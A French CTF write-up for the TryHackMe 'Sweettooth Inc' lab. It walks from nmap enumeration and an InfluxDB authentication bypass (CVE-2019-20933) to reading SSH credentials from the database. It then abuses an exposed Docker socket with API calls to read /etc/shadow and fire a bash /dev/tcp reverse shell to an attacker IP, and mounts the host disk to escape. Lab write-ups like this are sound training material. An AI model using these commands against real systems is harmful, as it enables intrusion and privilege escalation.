## Sweettooth Inc ##

# Task 1 Deploy the machine! #

# Task 2 Enumeration #

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.245.158 sweettooth.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A sweettooth.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-30 11:03 CEST
Nmap scan report for sweettooth.thm (10.10.245.158)
Host is up (0.037s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          49019/tcp   status
|   100024  1          49868/udp   status
|   100024  1          53154/tcp6  status
|_  100024  1          59223/udp6  status
2222/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)
|   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)
|   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)
|_  256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)
8086/tcp  open  http    InfluxDB http admin 1.3.0
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
49019/tcp open  status  1 (RPC #100024)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=10/30%OT=111%CT=1%CU=40509%PV=Y%DS=2%DC=T%G=Y%TM=617D0
OS:AB3%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)O
OS:PS(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506S
OS:T11NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)E
OS:CN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   32.81 ms 10.9.0.1
2   33.28 ms sweettooth.thm (10.10.245.158)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.52 seconds

```

Avec nmap on voit plusieurs services : 
Le service rpc bind sur le port 111.  
Le service SSH sur le port 2222.   
Le service HTTP sur le port 8086.  
Le service RPC sur le port 49019.  

**Do a TCP portscan. What is the name of the database software running on one of these ports?**  

D'après nmap sur le port 8086 on voit que la base de donnée est : InfluxDB  

# Task 3 Database exploration and user flag #

**What is the database user you find?**

Nous exploiter un faille expliqué sur le site [exploit](https://www.komodosec.com/post/when-all-else-fails-find-a-0-day)   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://sweettooth.thm:8086/debug/requests
{
"o5yY6yya:127.0.0.1": {"writes":2,"queries":2}
}
```

Nous avons 2 écritures et 2 requètes.  
Nous avons un nom d'utilisateur.   

L'utilisateur de base de donnée est : o5yY6yya  

**What was the temperature of the water tank at 1621346400 (UTC Unix Timestamp)?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ date -u -d '1970-01-01 1621346400 sec '
mar. 18 mai 2021 14:00:00 UTC

tim@kali:~/Bureau/tryhackme/write-up$ git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
Clonage dans 'InfluxDB-Exploit-CVE-2019-20933'...
remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (20/20), done.
remote: Total 20 (delta 5), reused 4 (delta 0), pack-reused 0
Réception d'objets: 100% (20/20), 5.97 Kio | 2.98 Mio/s, fait.
Résolution des deltas: 100% (5/5), fait.

tim@kali:~/Bureau/tryhackme/write-up/InfluxDB-Exploit-CVE-2019-20933$ python __main__.py 
  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |  
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ 
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_ 
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                                         | |                  
                                                         |_|                  
CVE-2019-20933

Insert ip host (default localhost): sweettooth.thm
Insert port (default 8086): 
Insert influxdb user (wordlist path to bruteforce username): o5yY6yya
Host vulnerable !!!
Databases list:
[
                            "2021-05-18T14:00:00Z",
                            93.3,
                            22.5
                        ],

5) mixer
Insert database name (exit to close): 4

[tanks] Insert query (exit to change db): SHOW MEASUREMENTS
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "fruitjuice_tank"
                        ],
                        [
                            "gelatin_tank"
                        ],
                        [
                            "sugar_tank"
                        ],
                        [
                            "water_tank"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}

[tanks] Insert query (exit to change db): SELECT * FROM water_tank;
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "filling_height",
                        "temperature"
                    ],
                    "name": "water_tank",
                    "values": [
...
                        [
                            "2021-05-18T14:00:00Z",
                            93.3,
                            22.5
                        ],

...
```

On calcule la bonne date en GMT qui le 18/05/2021 14:00:00.   
Avec influxexploitDB on se connecte à la basse de donnée.   
Dans la basse de donnée tanks on trouve à cette date la température de 22.5 c°.     

**What is the highest rpm the motor of the mixer reached?**   

```bash
[tanks] Insert query (exit to change db): exit
Databases list:

1) _internal
2) creds
3) docker
4) tanks
5) mixer

Insert database name (exit to close): mixer
[mixer] Insert query (exit to change db): show measurements;
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "mixer_stats"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
[mixer] Insert query (exit to change db): select max("motor_rpm") from mixer_stats;
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "max"
                    ],
                    "name": "mixer_stats",
                    "values": [
                        [
                            "2021-05-20T15:00:00Z",
                            4875
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}

```

Dans la base de donnée mixer on cherche la valeur maximum de motor rpm.  
La réponse est : 4875 

**What username do you find in one of the databases?**  


```bash
[mixer] Insert query (exit to change db): exit
Databases list:

1) _internal
2) creds
3) docker
4) tanks
5) mixer

Insert database name (exit to close): creds
[creds] Insert query (exit to change db): SHOW MEASUREMENTS;
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "ssh"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
[creds] Insert query (exit to change db): select * from ssh;       
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "pw",
                        "user"
                    ],
                    "name": "ssh",
                    "values": [
                        [
                            "2021-05-16T12:00:00Z",
                            7788764472,
                            "uzJk6Ry98d8C"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}

```

Dans la base donnée creds on trouve dans la table ssh des identifiants qui sont : 
778864472:uzJk6Ry98d8C   

Le non d'utilisateur est : uzJk6Ry98d8C  

**user.txt**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh uzJk6Ry98d8C@sweettooth.thm -p 2222
uzJk6Ry98d8C@sweettooth.thm's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tim@kali:~/Bureau/tryhackme/write-up$ ssh uzJk6Ry98d8C@sweettooth.thm -p 2222
uzJk6Ry98d8C@sweettooth.thm's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
uzJk6Ry98d8C@07c0bb6c7b3d:~$ pwd
/home/uzJk6Ry98d8C
uzJk6Ry98d8C@07c0bb6c7b3d:~$ ls
data  meta.db  user.txt  wal
uzJk6Ry98d8C@07c0bb6c7b3d:~$ cat user.txt 
THM{V4w4FhBmtp4RFDti}

```

On se connecte avec les identifiants et on trouve un fichir user.txt dans le répertoire.
On le lit et on a le flag.   

## Task 4 Privilege escalation ##

```bash
uzJk6Ry98d8C@07c0bb6c7b3d:~$ cd /
uzJk6Ry98d8C@07c0bb6c7b3d:/$ ls -al
total 84
drwxr-xr-x 62 root root 4096 Oct 30 15:09 .
drwxr-xr-x 62 root root 4096 Oct 30 15:09 ..
-rwxr-xr-x  1 root root    0 Oct 30 13:40 .dockerenv
drwxr-xr-x  2 root root 4096 May 18 14:50 bin
drwxr-xr-x  2 root root 4096 Apr 20  2017 boot
drwxr-xr-x 12 root root 2700 Oct 30 13:40 dev
-rwxrwxr-x  1 root root   88 Jul  8  2017 entrypoint.sh
drwxr-xr-x 82 root root 4096 Oct 30 13:40 etc
drwxr-xr-x  7 root root 4096 Oct 30 13:40 home
-rwxr-xr-x  1 root root 5105 May 18 14:46 initializeandquery.sh
drwxr-xr-x 16 root root 4096 May 18 14:49 lib
drwxr-xr-x  2 root root 4096 Jun 20  2017 lib64
drwxr-xr-x  2 root root 4096 Jun 20  2017 media
drwxr-xr-x  2 root root 4096 Jun 20  2017 mnt
drwxr-xr-x  2 root root 4096 Jun 20  2017 opt
dr-xr-xr-x 99 root root    0 Oct 30 13:40 proc
drwx------  4 root root 4096 May 18 14:50 root
drwxr-xr-x  5 root root 4096 Oct 30 15:17 run
drwxr-xr-x  2 root root 4096 May 18 14:49 sbin
drwxr-xr-x  2 root root 4096 Jun 20  2017 srv
dr-xr-xr-x 13 root root    0 Oct 30 15:25 sys
drwxrwxrwt  2 root root 4096 Oct 30 15:25 tmp
drwxr-xr-x 22 root root 4096 May 18 14:48 usr
drwxr-xr-x 21 root root 4096 Oct 30 15:09 var
```

En énumérant la racine on voit que l'on est sur un docker.   

```bash
uzJk6Ry98d8C@07c0bb6c7b3d:/$ cat entrypoint.sh 
#!/bin/bash
set -e

if [ "${1:0:1}" = '-' ]; then
    set -- influxd "$@"
fi

uzJk6Ry98d8C@07c0bb6c7b3d:/$ sudo -l
-bash: sudo: command not found
```

On enrtypoint peut exécuter des commandes mais que sudo n'existe pas.   

```bash
uzJk6Ry98d8C@07c0bb6c7b3d:/$ cat initializeandquery.sh | grep socat
socat TCP-LISTEN:8080,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock &
```

On voit que le script d'initialisation ecoute sur le port 8080.   

```bash
uzJk6Ry98d8C@07c0bb6c7b3d:/$ ss -lnp
Netid  State      Recv-Q Send-Q                                                                                    Local Address:Port                                                                                      Peer Address:Port 
nl     UNCONN     0      0                                                                                                     0:766                                                                                                   *     
nl     UNCONN     0      0                                                                                                     0:0                                                                                                     *     
nl     UNCONN     4352   0                                                                                                     4:27453                                                                                                 *     
nl     UNCONN     768    0                                                                                                     4:0                                                                                                     *     
nl     UNCONN     0      0                                                                                                     6:0                                                                                                     *     
nl     UNCONN     0      0                                                                                                     9:0                                                                                                     *     
nl     UNCONN     0      0                                                                                                    10:0                                                                                                     *     
nl     UNCONN     0      0                                                                                                    12:0                                                                                                     *     
nl     UNCONN     0      0                                                                                                    15:0                                                                                                     *     
nl     UNCONN     0      0                                                                                                    16:0                                                                                                     *     
u_dgr  UNCONN     0      0                                                                                                     * 24536                                                                                                * 24535 users:(("socat",pid=6808,fd=4))
u_dgr  UNCONN     0      0                                                                                                     * 24535                                                                                                * 24536 users:(("socat",pid=6808,fd=3))
tcp    LISTEN     0      5                                                                                                     *:8080                                                                                                 *:*      users:(("socat",pid=6808,fd=5))
tcp    LISTEN     0      128                                                                                                   *:22                                                                                                   *:*     
tcp    LISTEN     0      128                                                                                           127.0.0.1:8088                                                                                                 *:*      users:(("influxd",pid=21,fd=3))
tcp    LISTEN     0      128                                                                                                  :::8086                                                                                                :::*      users:(("influxd",pid=21,fd=5))
tcp    LISTEN     0      128                                                                                                  :::22                        
```

On voit qu'il une ecoute sur le port 8080, c'est un docker sock nous allons l'exploiter.  

```bash
uzJk6Ry98d8C@07c0bb6c7b3d:/tmp$ curl -s localhost:8080/containers/json | jq '.' | cat
[
  {
    "Id": "07c0bb6c7b3d65ca68a998675eaebfc1d13eac282cddbe1e7138f6af29cdf0c0",
    "Names": [
      "/sweettoothinc"
    ],
    "Image": "sweettoothinc:latest",
    "ImageID": "sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e",
    "Command": "/bin/bash -c 'chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry98d8C -c '/initializeandquery.sh & /entrypoint.sh influxd''",
    "Created": 1635601232,
    "Ports": [
      {
        "IP": "0.0.0.0",
        "PrivatePort": 22,
        "PublicPort": 2222,
        "Type": "tcp"
      },
      {
        "IP": "0.0.0.0",
        "PrivatePort": 8086,
        "PublicPort": 8086,
        "Type": "tcp"
      }
    ],
    "Labels": {},
    "State": "running",
    "Status": "Up 2 hours",
    "HostConfig": {
      "NetworkMode": "default"
    },
    "NetworkSettings": {
      "Networks": {
        "bridge": {
          "IPAMConfig": null,
          "Links": null,
          "Aliases": null,
          "NetworkID": "6f9f8c45785683031cc0ed60799e95cd36ed921bead5869762e16479c5388300",
          "EndpointID": "8623b261431ef47ffe6dd133a8ea961d295db96b7b4a2160eb13941701e6eb4e",
          "Gateway": "172.17.0.1",
          "IPAddress": "172.17.0.2",
          "IPPrefixLen": 16,
          "IPv6Gateway": "",
          "GlobalIPv6Address": "",
          "GlobalIPv6PrefixLen": 0,
          "MacAddress": "02:42:ac:11:00:02",
          "DriverOpts": null
        }
      }
    },
    "Mounts": [
      {
        "Type": "volume",
        "Name": "53cfa55ea3116cba33b303bf736d7aea7033bf531242c044593a84c5aa847b9e",
        "Source": "",
        "Destination": "/var/lib/influxdb",
        "Driver": "local",
        "Mode": "",
        "RW": true,
        "Propagation": ""
      },
      {
        "Type": "bind",
        "Source": "/var/run/docker.sock",
        "Destination": "/var/run/docker.sock",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
      }
    ]
  }
]
```

On voit la configuration de notre conteneur qui s'appelle : sweettoothinc  

```bash
uzJk6Ry98d8C@07c0bb6c7b3d:/tmp$ curl -i -s -X POST -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/shadow"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://localhost:8080/containers/07c0bb6c7b3d65ca68a998675eaebfc1d13eac282cddbe1e7138f6af29cdf0c0/exec
HTTP/1.1 201 Created
Api-Version: 1.38
Content-Type: application/json
Docker-Experimental: false
Ostype: linux
Server: Docker/18.06.3-ce (linux)
Date: Sat, 30 Oct 2021 15:59:00 GMT
Content-Length: 74

{"Id":"5d4964d9fa60f61dbef29b908d2b5f729cc0c60cd9847d528bb1fd4ccd99a7e0"}

uzJk6Ry98d8C@07c0bb6c7b3d:/tmp$ curl -i -s -X POST -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' http://localhost:8080/exec/5d4964d9fa60f61dbef29b908d2b5f729cc0c60cd9847d528bb1fd4ccd99a7e0/start
HTTP/1.1 200 OK
Content-Type: application/vnd.docker.raw-stream
Api-Version: 1.38
Docker-Experimental: false
Ostype: linux
Server: Docker/18.06.3-ce (linux)

Croot:*:17337:0:99999:7:::
daemon:*:17337:0:99999:7:::
bin:*:17337:0:99999:7:::
sys:*:17337:0:99999:7:::
sync:*:17337:0:99999:7:::
games:*:17337:0:99999:7:::
man:*:17337:0:99999:7:::
lp:*:17337:0:99999:7:::
mail:*:17337:0:99999:7:::
news:*:17337:0:99999:7:::
uucp:*:17337:0:99999:7:::
proxy:*:17337:0:99999:7:::
www-data:*:17337:0:99999:7:::
ackup:*:17337:0:99999:7:::
list:*:17337:0:99999:7:::
irc:*:17337:0:99999:7:::
�gnats:*:17337:0:99999:7:::
obody:*:17337:0:99999:7:::
%systemd-timesync:*:17337:0:99999:7:::
$systemd-network:*:17337:0:99999:7:::
$systemd-resolve:*:17337:0:99999:7:::
&systemd-bus-proxy:*:17337:0:99999:7:::
influxdb:!:17355::::::
sshd:*:18765:0:99999:7:::
�uzJk6Ry98d8C:$6$d9j6O49V$K2KCZOSFjDE8tH3KM6XSer/iLGts0YHcrF8184KoJF03vRQbZsvDMiYQnccKRja2UoUnHeYdxxTNwnznrHq2d0:18765:0:99999:7:::

```

On test notre exploit lire le fichier /etc/shadow ça fonctionne.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

On écoute le port pout avoit un shell.   

```bash
uzJk6Ry98d8C@07c0bb6c7b3d:/tmp$ echo "bin/bash -i &>/dev/tcp/10.9.228.66/1234 0>&1" > revshell.sh
uzJk6Ry98d8C@07c0bb6c7b3d:/tmp$ chmod +x revshell.sh 
```

On prépare le reverse shell.   

```bash
uzJk6Ry98d8C@07c0bb6c7b3d:/tmp$ curl -i -s -X POST -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["/bin/bash", "-c", "/tmp/revshell.sh"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://localhost:8080/containers/07c0bb6c7b3d65ca68a998675eaebfc1d13eac282cddbe1e7138f6af29cdf0c0/exec
HTTP/1.1 201 Created
Api-Version: 1.38
Content-Type: application/json
Docker-Experimental: false
Ostype: linux
Server: Docker/18.06.3-ce (linux)
Date: Sat, 30 Oct 2021 16:23:34 GMT
Content-Length: 74

{"Id":"3006cd2f4dd8de69abb3209f60fe0655ef506dba82eaa4e5fea48f948f09fb91"}
uzJk6Ry98d8C@07c0bb6c7b3d:/tmp$ curl -i -s -X POST -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' http://localhost:8080/exec/3006cd2f4dd8de69abb3209f60fe0655ef506dba82eaa4e5fea48f948f09fb91/start
HTTP/1.1 200 OK
Content-Type: application/vnd.docker.raw-stream
Api-Version: 1.38
Docker-Experimental: false
Ostype: linux
Server: Docker/18.06.3-ce (linux)
```

On exécute notre shell.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.188.76.
Ncat: Connection from 10.10.188.76:53918.
root@07c0bb6c7b3d:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@07c0bb6c7b3d:/# cat /root/root.txt
cat /root/root.txt
THM{5qsDivHdCi2oabwp}
```

On obtient un shell root, on lit le fichier root.txt dans le répertoire root et on obtient notre flag.  
Le flag est : THM{5qsDivHdCi2oabwp}  

## Task 5 Escape! ##  

**The second /root/root.txt**  

```bash
root@07c0bb6c7b3d:/# fdisk -l
fdisk -l

Disk /dev/xvda: 16 GiB, 17179869184 bytes, 33554432 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xa8257195

Device     Boot    Start      End  Sectors  Size Id Type
/dev/xvda1 *        2048 32088063 32086016 15.3G 83 Linux
/dev/xvda2      32090110 33552383  1462274  714M  5 Extended
/dev/xvda5      32090112 33552383  1462272  714M 82 Linux swap / Solaris

Disk /dev/xvdh: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
```

On regarde les partions, la partition xvda1 semble être la partion host.  

```bash
root@07c0bb6c7b3d:/# mkdir /tmp/disk
mkdir /tmp/disk
root@07c0bb6c7b3d:~# mount /dev/xvda1 /mnt/disk
mount /dev/xvda1 /mnt/disk
root@07c0bb6c7b3d:~# cat /mnt/disk/root/root.txt
cat /mnt/disk/root/root.txt
THM{nY2ZahyFABAmjrnx}
```

On monte la partition host et on lit le flag dans root.txt qui est dans le répertoire root de la partition montée.  
Le flag est : THM{nY2ZahyFABAmjrnx}    






